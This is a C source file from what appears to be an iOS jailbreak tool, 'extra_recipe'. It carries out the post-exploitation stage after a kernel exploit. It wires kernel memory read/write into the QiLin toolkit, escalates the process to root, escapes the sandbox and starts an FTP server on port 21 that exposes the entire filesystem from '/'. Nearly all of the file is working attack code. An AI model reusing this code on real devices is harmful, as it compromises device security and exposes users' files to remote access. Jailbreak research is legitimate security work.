//
//  postexploit.c
//  extra_recipe
//
//  Created by Sem Voigtländer on 6/5/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//

#include "postexploit.h"
#include "QiLin.h"
#include "kmem.h"
#include "offsets.h"
#include "pureftpd.h"
#include <sys/mman.h>

// This will not enable all QiLin features - but enough for us
void _init_tfp0less_qilin(uint64_t kaslr_shift) {
  uint64_t kernproc = offsets.kernproc + kaslr_shift;
  uint64_t *m =
      (uint64_t *)mmap((void *)0x110000000, 0x4000, PROT_READ | PROT_WRITE,
                       MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  *m = (uint64_t)__readKernelMemory;
  *(m + 1) = (uint64_t)__writeKernelMemory;
  *(m + 2) = kernproc;
}

void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift,
                       int kppless) {
  printf("Stage 2: Escalating to root and escaping sandbox...\n");

  printf("Initializing QiLin...\n");

  if (!MACH_PORT_VALID(tfp0) || tfp0 == MACH_PORT_NULL || kppless) {
    _init_tfp0less_qilin(kaslr_shift);
    initQiLin(0x1337, kernel_base);
  } else {
    initQiLin(tfp0, kernel_base);
  }
  printf("Initializing Jonathan Levin's jailbreak toolkit...\n");

  printf("Our context before escalation: uid: %d gid: %d user: %s euid: %d "
         "egid: %d\n",
         getuid(), getgid(), getlogin(), geteuid(), getegid());

  printf("Escalating our process to the root context...\n");
  if (!rootifyMe()) {
    printf("Failed to escalate to the root user by using Levine's logic.\n");
  }

  printf("Our context after escalation: uid: %d gid: %d user: %s euid: %d "
         "egid: %d\n",
         getuid(), getgid(), getlogin(), geteuid(), getegid());

  printf("Escaping the sandbox...\n");
  if (!ShaiHuludMe(0)) {
    printf("Failed to escape the sandbox using Levine's logic.\n");
  }

  printf("If all went well, sandbox escaped and root achieved now, you might "
         "want to manually verify that.\n");

  printf("Stage 3: Remounting the rootfilesystem.\n");
  printf("Using SparkZheng's bug in APFS to path and remount the "
         "rootfilesystem as writeable.\n");

  printf("Stage 3.1: Userland patches.\n");

  printf("This is currently not implemented yet, continueing...\n");

  printf("Stage 4: Shell access and FTP server.\n");
  printf("Starting our FTP server (MTFTP/PureFTPd) on port 21 as %s...\n",
         getlogin());

  char *ftp_rootdir = "/";
  int ftp_port = 21;      // Simply cannot be changed yet
  int ftp_argc = 0;       // No arguments needed, so 0
  char **arguments = {0}; // remember, never make it NULL!!!

  pureftpd_start(ftp_argc, arguments, ftp_rootdir, ftp_port);
}
